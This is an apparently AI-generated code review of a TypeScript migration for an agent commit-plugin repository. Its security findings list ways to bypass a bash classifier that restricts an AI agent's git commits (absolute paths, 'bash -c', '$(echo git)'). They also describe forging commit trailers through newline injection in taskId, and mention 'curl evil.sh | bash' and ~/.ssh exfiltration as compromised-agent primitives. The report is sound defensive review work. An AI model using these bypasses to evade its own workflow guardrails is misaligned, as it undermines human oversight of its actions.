# Code Review — Last 5 Commits on `feature/harness`

**Range:** `b02eb05~1..cd566f3` · **Branch:** `feature/harness` · **Date:** 2026-05-20

**Scope:** TypeScript migration pilot. Two structural commits + spec + plan + fixup:

- `b02eb05` docs(specs): add src TypeScript migration commit-pilot design
- `5f869ac` docs(plans): add src TypeScript migration commit-pilot implementation plan
- `ca91826` build(root): switch src/ to TS-only with dist/ output via tsup (bundle:false)
- `c2be151` refactor: absorb commit workspace into `src/modules/commit/`
- `cd566f3` fixup: address final review findings

Net delta: +2767 / −1178 across 65 files. Build pipeline: `tsc src→src` ➝ `tsup src/→dist/` (bundle:false) + `scripts/copy-root-assets.mjs` for markdown.

**Tooling:** `npm run lint` clean for changed files (4 pre-existing `no-explicit-any` errors outside scope). `tsc --noEmit` clean. `npm audit` 0 vulnerabilities. Trufflehog 0 secrets in commit range. Semgrep 0 findings on touched files. `npm pack` ships only `dist/**` + workspace dists, no test sources.

---

## Summary

| Severity | Count | Domains |
|---|---|---|
| CRITICAL | 0 | — |
| HIGH | 0 | — |
| MEDIUM | 5 | Maintainability (2), Architecture (1), Documentation (1), Composite (1) |
| LOW | 11 | Security (5), Maintainability (4), Documentation (2) |
| Info | 2 | Positive findings |

**Verdict:** **APPROVED FOR MERGE.** The migration is clean, well-staged, and atomically revertible. No critical, no high-severity defects after adversarial verification. Two initial HIGH security findings (symlink follow in build script, bash-policy classifier bypassable) were downgraded to LOW by the Challenger — the build script runs only on the maintainer's machine on already-trusted source, and the bash-policy is documented as a workflow rail, not a security boundary (project doctrine in `docs/plugins/coordinator.md:164` already articulates: *"Treat code-enforced rules as the security boundary. The LLM-requested rules are defense in depth."*). One initial HIGH documentation finding (spec/plan reference wrong tsup config filename) was downgraded to MEDIUM but remains the highest-impact item because it is a real foot-gun for the next agent-executed migration stage.

---

## Verification Summary

**Method:** Cross-domain correlation and adversarial review (Cross-Verifier + Challenger).

| Metric | Count |
|--------|-------|
| Findings verified | 18 |
| False positives removed | 0 |
| Severity adjustments | 3 (SEC-001 HIGH→LOW, SEC-002 HIGH→LOW, DOC-001 HIGH→MEDIUM) |
| Cross-analysis composite findings added | 1 MEDIUM + 4 contextual notes |
| New findings surfaced by cross-verifier | 2 (SEC-005 trailer injection, DOC-004 docs/plugins/commit.md not updated for absorbed-module layout) |

### Cross-Analysis (Security ↔ Quality ↔ Documentation)

- **SEC-002 (bash bypass) ↔ AGENTS.md L209 / docs/plugins/commit.md L3, L34-35** — Docs call it "policy enforcement" without the *defense-in-depth* qualifier already established elsewhere in the project. Recommend matching the doctrine that coordinator.md already states.
- **MAINT-001 (silent catch) ↔ SEC-003 (fallback escapes install root)** — The bare `catch {}` widens SEC-003's trigger from ENOENT-only to "any read error." Single patch (narrow the catch to `ENOENT`) fixes both.
- **MAINT-007 (qa missing from `verify-dist-sync`) ↔ DOC-003 (no doc warns about omission)** — Both the gate and the contributor guide omit the same package. Pair the fix.
- **DOC-001 (spec/plan filename) ↔ MAINT-006 (non-standard tsup filename)** — MAINT-006 is "acceptable" *only if* the spec is in sync; with the spec out of sync, the next agent-executed stage will literally create `tsup.config.ts` and silently break workspace builds with `bundle: false`.

### Challenged Findings

| Finding | Before | After | Rationale |
|---|---|---|---|
| SEC-001 (symlink follow in `copy-root-assets.mjs`) | HIGH (CVSS 7.1) | LOW | Build script; attacker who can plant a symlink in `src/` already has full write access. `tsup --clean` wipes `dist/` first; large binary copies would be caught at `git diff`. CWE-59 applies but realistic impact is Low. |
| SEC-002 (bash-policy classifier bypassable) | HIGH (CVSS 6.5) | LOW | Project doctrine explicitly frames LLM-prompt rules as defense-in-depth, not security boundary (coordinator.md:164). The bash-policy backstops a forgetful agent; the developer can `git commit` from any other terminal. CWE-693 mischaracterizes the asset. Recommended fix is to update commit-plugin docs to match the doctrine, not to harden the regex into a sandbox. |
| DOC-001 (`tsup.config.ts` vs `tsup.root.config.ts` in spec/plan) | HIGH | MEDIUM | Spec/plan are historical artifacts; the rename is documented in commit body and inline file comment. But the plan is *explicitly written for agentic execution* ("REQUIRED SUB-SKILL: subagent-driven-development"), so Stage 2 will follow it literally and create `tsup.config.ts`, which gets auto-discovered by workspace tsup invocations and breaks every workspace build. Concrete next-action failure mode → MEDIUM. |

---

## Findings

### [MEDIUM] DOC-001: Spec & plan reference `tsup.config.ts` but implemented file is `tsup.root.config.ts`

**Status:** ✅ Fixed (2026-05-20)

**ID:** DOC-001
**Location:** `docs/superpowers/specs/2026-05-20-src-typescript-migration-commit-pilot-design.md:101, 147, 160, 197` and `docs/superpowers/plans/2026-05-20-src-typescript-migration-commit-pilot.md:18, 23, 87, 90, 92, 201, 356, 420`
**Category:** Documentation
**Effort:** trivial

**Problem:**
Both design spec and implementation plan name the new config `tsup.config.ts` in 12 places. The actual file is `tsup.root.config.ts` and `package.json:28` invokes it explicitly via `tsup --config tsup.root.config.ts`. The rationale lives only as a code comment inside the file and in the body of commit `ca91826`.

**Impact:**
The plan is explicitly authored for agentic workers ("REQUIRED SUB-SKILL: subagent-driven-development"). Stage 2 of the migration (per the plan's *"Suggested ordering for subsequent absorptions"*) will follow the plan literally and create `tsup.config.ts`, which tsup will auto-discover from each workspace's cwd, leaking `bundle: false` into every workspace build. Verified previously: `packages/skill-utils/dist/index.js` had unresolved imports because bundle:false was applied. This regression cost is the entire reason the file was renamed in the first place.

**Remediation:**
Single editorial pass:

- Replace `tsup.config.ts` with `tsup.root.config.ts` in spec (4 lines) and plan (8 lines).
- Add 1-2 sentence "Deviation from original plan" note at the top of each: tsup auto-discovers a `tsup.config.ts` in any parent of the cwd, so the root config must be named distinctively and invoked with explicit `--config`.

---

### [MEDIUM] MAINT-001: Bare `catch {}` in `loadCommitCommandTemplate` masks all errors from the packaged path

**Status:** ✅ Fixed (2026-05-20)

**ID:** MAINT-001
**Location:** `src/modules/commit/index.ts:16-22`
**Category:** Maintainability (error handling)
**Effort:** trivial

**Problem:**

```typescript
function loadCommitCommandTemplate(): string {
  try {
    return readFileSync(packagedCommandPath, "utf8")
  } catch {
    return readFileSync(sourceCommandPath, "utf8")
  }
}
```

The catch swallows every error — `ENOENT`, `EACCES`, `EISDIR`, `EMFILE`, transient I/O — and silently falls through to the dev-tree path. If both reads fail, the user sees only the *secondary* error, hiding the actual cause.

**Impact:**
In a packaged consumer install, `sourceCommandPath` resolves to `node_modules/<pkg>/src/commands/commit.md` — a path that does not exist in published installs (npm ships only `dist/**`). So any non-ENOENT failure on `packagedCommandPath` (mode bits, SELinux, transient I/O) produces a confusing "file not found" against the dev fallback path instead of the real error. This also widens SEC-003 (dev fallback escapes install root) from theoretical to practical.

**Remediation:**

```typescript
function isFileNotFoundError(error: unknown): boolean {
  return (
    typeof error === "object" &&
    error !== null &&
    "code" in error &&
    (error as { code?: string }).code === "ENOENT"
  )
}

function loadCommitCommandTemplate(): string {
  try {
    return readFileSync(packagedCommandPath, "utf8")
  } catch (error) {
    if (!isFileNotFoundError(error)) {
      throw error
    }
    return readFileSync(sourceCommandPath, "utf8")
  }
}
```

Optional follow-up: gate the dev fallback behind a dev-mode detector (e.g., `import.meta.url.includes("/src/")`) so published installs fail closed.

---

### [MEDIUM] ARCH-001: `createControlledCommit` is not injection-friendly (DIP / testability)

**Status:** ✅ Fixed (2026-05-20)

**ID:** ARCH-001
**Location:** `src/modules/commit/controlled-commit.ts:1-82`
**Category:** Architecture (Dependency Inversion / testability)
**Effort:** easy

**Problem:**
`controlled-commit.ts` directly imports `execFile` from `node:child_process` and binds at module scope. No seam for unit tests to substitute a fake shell. Every git-orchestration test must spin up `mkdtemp` + `git init` + `git config` — slow, environment-dependent.

**Impact:**
Not a new defect — the package was already shaped this way before the move. Calling it out so it doesn't become invisible after absorption. As more git interaction lands in `src/modules/`, integration-only testing will not scale.

**Remediation:** out-of-scope; track as follow-up.

```typescript
export interface GitRunner {
  (cwd: string, args: string[]): Promise<GitResult>
}

const defaultGitRunner: GitRunner = async (cwd, args) => { /* execFileAsync body */ }

export interface ControlledCommitInput {
  cwd: string
  message: string
  files?: string[]
  taskId?: string
  runGit?: GitRunner   // injectable for unit tests
}
```

---

### [MEDIUM] MAINT-002: Inconsistent terminology — "absorbed module" vs "root-resident module"

**Status:** ✅ Fixed (2026-05-20)

**ID:** MAINT-002
**Location:** `AGENTS.md` (Layout table L3, "Root Entrypoint Registration" §73, "Adding a New Root-Resident Module" §171, prose at L45)
**Category:** Maintainability (documentation consistency)
**Effort:** trivial

**Problem:**
Section heading says "Adding a New Root-Resident Module" (L171) but the surrounding prose consistently uses "absorbed modules". A reader grepping for one term won't find the other.

**Spec acknowledges** the terminology is deliberately deferred (*"Naming: modules/ vs plugins/ vs features/ — revisit after stage 1 lands"*), so the inconsistency is not surprising — but pick one for the prose now to avoid drift across future stages.

**Remediation:** pick one (recommend "absorbed module") and apply consistently to heading and body.

---

### [MEDIUM] COMPOSITE-001: QA workspace dist drift is unguarded in code and unmentioned in docs

**Status:** ✅ Fixed (2026-05-20)

**ID:** COMPOSITE-001
**Location:** `scripts/verify-dist-sync.mjs:9-18` (missing `"packages/qa/dist"`) + `AGENTS.md` (no doc warning)
**Category:** Composite (Maintainability + Documentation)
**Effort:** trivial

**Problem:**
`package.json` `files` includes `packages/qa/dist`, `.gitignore` carves out the exception, README and AGENTS.md list `qa` as a published plugin — but `verify-dist-sync.mjs` `trackedDistPaths` omits it. CI silently passes when `packages/qa/dist/` drifts from `packages/qa/src/`. The spec acknowledges this as a *"pre-existing bug, out of scope for this stage"* but no in-repo doc warns maintainers.

**Remediation:**

```diff
 const trackedDistPaths = [
   "dist",
   "packages/python-developer/dist",
   "packages/code-review/dist",
   "packages/frontend-developer/dist",
   "packages/skill-utils/dist",
   "packages/skill-registry/dist",
   "packages/swift-developer/dist",
   "packages/coordinator/dist",
+  "packages/qa/dist",
 ]
```

Optionally add a "Tracked dist paths in CI" subsection to AGENTS.md "Build & Packaging Details" pointing at the script as source of truth, so the next workspace addition does not repeat the omission.

---

### [LOW] SEC-001: Recursive asset copier follows symlinks (link following)

**Status:** ✅ Fixed (2026-05-20)

**ID:** SEC-001
**Location:** `scripts/copy-root-assets.mjs:14-30`
**Category:** Security
**CWE:** CWE-59
**Effort:** trivial

**Problem:**
`copyMarkdownRecursive` uses `statSync` (follows symlinks) and `copyFileSync` (reads through symlinks). A symlink at `src/commands/leak.md` → `~/.ssh/id_rsa` would resolve and the target content would land in `dist/commands/leak.md`. Empirically verified.

**Impact (challenger-adjusted):**
Build script runs only on the maintainer's machine and in CI. An attacker who can plant the symlink already has write access to `src/`, which means they have already won. `tsup --clean` wipes `dist/` first; any large binary blob copied from `/etc/passwd` would be obvious at `git diff`. Defensive 1-line fix is recommended; the original HIGH severity overstated the realistic threat.

**Remediation:**

```typescript
import { lstatSync } from "node:fs"

function copyMarkdownRecursive(sourceDir, destDir) {
  if (!existsSync(sourceDir)) return
  mkdirSync(destDir, { recursive: true })
  for (const entry of readdirSync(sourceDir, { withFileTypes: true })) {
    const sourcePath = path.join(sourceDir, entry.name)
    const destPath   = path.join(destDir, entry.name)
    const stats = lstatSync(sourcePath)
    if (stats.isSymbolicLink()) continue
    if (stats.isDirectory()) {
      copyMarkdownRecursive(sourcePath, destPath)
    } else if (stats.isFile() && entry.name.endsWith(".md")) {
      copyFileSync(sourcePath, destPath)
      copiedCount++
    }
  }
}
```

---

### [LOW] SEC-002: `classifyBashCommand` is bypassable by absolute paths, shell wrappers, and git plumbing

**Status:** ✅ Fixed (2026-05-20)

**ID:** SEC-002
**Location:** `src/modules/commit/bash-policy.ts:17-79`
**Category:** Security (Defense-in-depth)
**Effort:** medium (if hardening); trivial (if documenting)

**Problem:**
The classifier only matches the literal token `git`. Verified bypasses: `/usr/bin/git commit -m x`, `bash -c "git commit -m x"`, `hub commit`, `command git commit`, alias indirection, `$(echo git) commit`, plumbing subcommands (`commit-tree`, `fast-import`, `update-ref`).

**Impact (challenger-adjusted):**
The bash-policy layer is documented as **policy enforcement** / workflow rail, not a security boundary. Project doctrine in `docs/plugins/coordinator.md:164` already establishes: *"Treat code-enforced rules as the security boundary. The LLM-requested rules are defense in depth — they raise the cost of a successful prompt-injection escalation but are not the last line of defense."* The bash-policy backstops a forgetful or weakly prompt-injected agent; a fully compromised agent has far worse primitives (`curl evil.sh | bash`, exfiltrate `~/.ssh`). The asset protected is workflow consistency (Conventional Commits, no AI co-author lines, no auto-push), not secrets/auth.

**Remediation:**
Pick one (or both):

1. **Documentation fix (preferred, cheap):** add a Limitations section to `docs/plugins/commit.md` and `AGENTS.md` L209 acknowledging this is defense-in-depth, listing the known bypass shapes, and pointing at the coordinator doctrine.
2. **Opportunistic hardening:** match trailing `/git` and `/hub` basenames, recursively classify `bash -c <payload>` / `sh -c <payload>`, add `commit-tree`, `fast-import`, `update-ref` to the blocked list.

---

### [LOW] SEC-003: Lazy template loader fallback resolves outside install root

**Status:** ✅ Fixed (2026-05-20)

**ID:** SEC-003
**Location:** `src/modules/commit/index.ts:14`
**Category:** Security (Insecure design — informational)
**CWE:** CWE-22 (theoretical)
**Effort:** trivial

**Problem:**
`sourceCommandPath = path.resolve(moduleDirectory, "../../../src/commands/commit.md")` resolves outside the package's `dist/` install layout. The path is derived only from `import.meta.url` (no user input), so traversal-via-input is not possible. Risk is limited to: (a) the fallback never working in published installs (functional, not security), (b) in a sibling-install context, a different `src/commands/commit.md` could be picked up.

Combined with MAINT-001 (silent catch), the fallback can be silently activated by any non-ENOENT failure of the packaged read — see Cross-Analysis above.

**Remediation:**

Best: remove the fallback for published installs. The dev fallback can be gated:

```typescript
const isDevEnvironment = import.meta.url.includes("/src/")
function loadCommitCommandTemplate(): string {
  if (isDevEnvironment) return readFileSync(sourceCommandPath, "utf8")
  return readFileSync(packagedCommandPath, "utf8")
}
```

Alternatively, narrow the catch to `ENOENT` (covers MAINT-001 and most of SEC-003 in one patch).

---

### [LOW] SEC-004: Dynamic `import()` of `dist/` artifact in test (intentional, low concern)

**Status:** ✅ Fixed (2026-05-20)

**ID:** SEC-004
**Location:** `tests/modules/commit/build-output.test.ts:11, 20`
**Category:** Security (informational)
**Effort:** none (informational) / trivial (cross-platform polish)

**Problem:**
The test imports `dist/modules/commit/index.js` dynamically. Acceptable: dist is built fresh by `npm run build:root` immediately before vitest runs, and the path is derived from `import.meta.url` (no user input). The test is the only automated guard for the packaged branch of `loadCommitCommandTemplate`.

**Minor polish:** the dynamic import uses an absolute filesystem path; on Windows this would need `pathToFileURL` (matches `tests/root-plugin.test.ts:26`).

```diff
- const { AppVerkCommitPlugin } = await import(builtPluginPath)
+ const { AppVerkCommitPlugin } = await import(pathToFileURL(builtPluginPath).href)
```

---

### [LOW] SEC-005: `taskId` is interpolated into the commit footer without sanitization

**Status:** ✅ Fixed (2026-05-20)

**ID:** SEC-005
**Location:** `src/modules/commit/message-policy.ts:32`
**Category:** Security (input handling)
**CWE:** CWE-93 (CRLF injection variant)
**Effort:** trivial

**Problem:**
`normalizeCommitMessage` validates the header against `COMMIT_HEADER` and rejects `co-authored-by:` footers, but `taskId` is interpolated raw:

```typescript
const refsFooter = `Refs: ${taskId}`
// ...
return `${normalized}\n\n${refsFooter}`
```

A `taskId` value containing `"\nSigned-off-by: x@example.com"` (or any newline) injects a forged trailer past the disallowed-footers check (which only runs over `lines` derived from `normalized`, not the appended footer). The `av_commit` tool exposes `taskId` as an agent-controlled string argument.

**Impact:**
In practice the developer controls the agent and can already commit whatever they want. But it does allow an agent (or a prompt-injected one) to forge sign-off footers, attribution, or smuggle a `Co-Authored-By:` past the disallow filter — bypassing the explicit prohibition in the commit skill.

**Remediation:**

```typescript
function sanitizeTaskId(taskId: string): string {
  if (/[\r\n]/.test(taskId)) {
    throw new Error("Task ID must not contain newlines.")
  }
  return taskId.trim()
}

// ...
const sanitized = sanitizeTaskId(taskId)
const refsFooter = `Refs: ${sanitized}`
```

Additionally consider re-validating the *combined* normalized string against `DISALLOWED_FOOTERS` after appending.

---

### [LOW] MAINT-003: Getter on plain config object (lazy template, unidiomatic but defensible)

**Status:** ✅ Fixed (2026-05-20)

**ID:** MAINT-003
**Location:** `src/modules/commit/index.ts:42-45`
**Category:** Maintainability (style)
**Effort:** none

**Verdict:** Acceptable. The lazy initialization is correctly implemented and cached. Be aware that JSON-serializing the config invokes the getter, and spread-cloning materializes the value as a plain string. If laziness is not actually needed (the file is ~5 KB and synchronous), a plain eagerly-initialized property would be more boring.

---

### [LOW] MAINT-004: `tests/modules/commit/build-output.test.ts` not cross-platform

**Status:** ✅ Fixed (2026-05-20)

**ID:** MAINT-004
**Location:** `tests/modules/commit/build-output.test.ts:20`
**Category:** Maintainability (portability)
**Effort:** trivial

See SEC-004 remediation. Use `pathToFileURL(builtPluginPath).href` for Windows compatibility.

---

### [LOW] MAINT-005: `scripts/copy-root-assets.mjs` duplicates functionality available in Node `cpSync`

**Status:** ✅ Fixed (2026-05-20)

**ID:** MAINT-005
**Location:** `scripts/copy-root-assets.mjs:1-40`
**Category:** Maintainability (concision)
**Effort:** trivial

40 lines could be ~10 using `cpSync` with a filter. Current version is portable and intentionally a no-op on missing source dirs (per spec). Optional simplification:

```typescript
import { cpSync, statSync } from "node:fs"
for (const root of sourceRoots) {
  const src = path.join(repoRoot, "src", root)
  if (!existsSync(src)) continue
  cpSync(src, path.join(repoRoot, "dist", root), {
    recursive: true,
    verbatimSymlinks: true,  // Node 22+; or filter via lstatSync
    filter: (source) => statSync(source).isDirectory() || source.endsWith(".md"),
  })
}
```

Note: `cpSync` follows symlinks by default — same defect as SEC-001. Use `verbatimSymlinks: true` or filter out symlinks via `lstatSync`.

---

### [LOW] MAINT-006: `tsup.root.config.ts` non-standard filename (acceptable workaround, low-grade debt)

**Status:** ✅ Fixed (2026-05-20)

**ID:** MAINT-006
**Location:** `tsup.root.config.ts:1-16`
**Category:** Maintainability
**Effort:** none now; trivial later

The non-standard name is intentional and documented inline. Rationale is correct: tsup auto-discovers `tsup.config.ts` from any cwd; a shared name would leak `bundle: false` into workspaces. Track as "consolidation cleanup": once all workspaces are absorbed, rename to `tsup.config.ts`.

---

### [LOW] DOC-002: Spec/plan documents not linked from README / AGENTS index

**Status:** ✅ Fixed (2026-05-20)

**ID:** DOC-002
**Location:** `README.md:315-326` (Documentation section); `AGENTS.md` (no index of superpowers docs)
**Category:** Documentation (discoverability)
**Effort:** trivial

The new spec/plan describe a multi-stage absorption program ("Stage 1 of N"), but neither file is discoverable from the README documentation list or AGENTS.md. Future stages risk re-deriving or contradicting hard-won decisions (`bundle: false` rationale, build-order constraints, the `tsup.root.config.ts` filename).

Add an "Architecture & Migration" subsection to README Documentation, or a reference under AGENTS.md "Adding a New Root-Resident Module" pointing at the spec as canonical pattern.

---

### [LOW] DOC-003: `verify-dist-sync.mjs` missing `packages/qa/dist` is not flagged in any in-repo doc

**Status:** ✅ Fixed (2026-05-20)

**ID:** DOC-003
**Location:** `scripts/verify-dist-sync.mjs:9-18`
**Category:** Documentation
**Effort:** trivial

See COMPOSITE-001. The spec acknowledges this as a pre-existing bug; AGENTS.md, README, and the script itself do not. Either fix the bug (add the path) or add a comment explaining the omission. Preferred: fix the bug.

---

### [LOW] DOC-004: `docs/plugins/commit.md` describes structure as a separate package

**Status:** ✅ Fixed (2026-05-20)

**ID:** DOC-004
**Location:** `docs/plugins/commit.md` (overall tone and "Project Structure" sections)
**Category:** Documentation
**Effort:** easy

While "Prompt Source" (L18-22) was correctly updated to point at `src/commands/commit.md` / `dist/commands/commit.md`, the rest of the document still reads as if `packages/commit/` existed. There is no mention that the commit plugin is now an *absorbed root-resident module* under `src/modules/commit/`. Update the architecture/structure prose to reflect the new home.

---

### [INFO] POS-001: `AV_COMMIT_SKILL=1` hook-bypass is NOT present

**ID:** POS-001
**Location:** entire commit range
**Category:** Security (positive finding)

The user asked whether `AV_COMMIT_SKILL=1` or any documented git-hook-bypass exists in the code that a malicious commit could exploit. Search result: zero references in `src/`, `dist/`, `src/commands/commit.md`. The single repository-wide reference is a **negative assertion** at `tests/modules/commit/plugin.test.ts:26` (`expect(template).not.toContain("AV_COMMIT_SKILL=1")`) — verifying the bypass is *not* advertised in the template. `controlled-commit.ts` always runs `git commit -m <msg>` without `--no-verify`, so repository hooks at the target `cwd` always run.

---

### [INFO] POS-002: Test coverage for both branches of the template loader

**ID:** POS-002
**Location:** `tests/modules/commit/` × 5 files
**Category:** Maintainability (positive finding)

4 unit/integration tests exercise the dev-fallback branch via `../../../src/modules/commit/...` imports. 1 new `build-output.test.ts` exercises the packaged branch via `dist/modules/commit/index.js`. Together they cover both branches of `loadCommitCommandTemplate` end-to-end. Aligned with spec Commit-2 step 14.

---

## Priority Action Items

### Before merge: none. The migration is mergeable as-is.

### Before next stage (recommended):

1. **DOC-001** — Update spec & plan to use `tsup.root.config.ts` with a "Deviation" note. Critical for the next agent-executed absorption to not break workspace builds.
2. **MAINT-001** — Narrow the `catch` in `loadCommitCommandTemplate` to `ENOENT` only. One-line patch; addresses MAINT-001 and most of SEC-003 simultaneously.
3. **SEC-005** — Sanitize newlines in `taskId` to prevent forged trailers.

### Track as follow-up:

4. **COMPOSITE-001 / DOC-003** — Add `packages/qa/dist` to `verify-dist-sync.mjs` and document the tracked paths in AGENTS.md.
5. **SEC-001** — Defensive `lstatSync` + symlink-skip in `copy-root-assets.mjs`.
6. **SEC-002** — Update commit-plugin docs to position the bash-policy as defense-in-depth (matching coordinator doctrine), and/or harden the classifier for `bash -c` and basename matches.
7. **ARCH-001** — Add a `runGit` injection seam to `controlled-commit.ts`.
8. **MAINT-002** — Pick one term ("absorbed module" or "root-resident module") and apply consistently in AGENTS.md.
9. **MAINT-004** — Use `pathToFileURL` in `build-output.test.ts`.
10. **DOC-002 / DOC-004** — Link spec/plan from README; update `docs/plugins/commit.md` to reflect absorbed-module layout.
11. **MAINT-006** — Track `tsup.root.config.ts` → `tsup.config.ts` rename for after full consolidation.
12. **ESLint cleanup** (outside this PR) — fix 4 pre-existing `no-explicit-any` errors and consider adding `.worktrees/**` to ESLint ignores.

---

## Files Reviewed

- `src/modules/commit/index.ts`, `bash-policy.ts`, `controlled-commit.ts`, `message-policy.ts`
- `src/index.ts`
- `scripts/copy-root-assets.mjs`, `scripts/verify-dist-sync.mjs`
- `tsup.root.config.ts`
- `tests/modules/commit/*.ts`, `tests/root-plugin.test.ts`
- `package.json`, `.gitignore`, `tsconfig.json`, `tsconfig.base.json`
- `AGENTS.md`, `README.md`, `docs/plugins/commit.md`
- `docs/superpowers/specs/2026-05-20-src-typescript-migration-commit-pilot-design.md`
- `docs/superpowers/plans/2026-05-20-src-typescript-migration-commit-pilot.md`
- `dist/modules/commit/*.js`, `dist/commands/commit.md`, `dist/index.js`
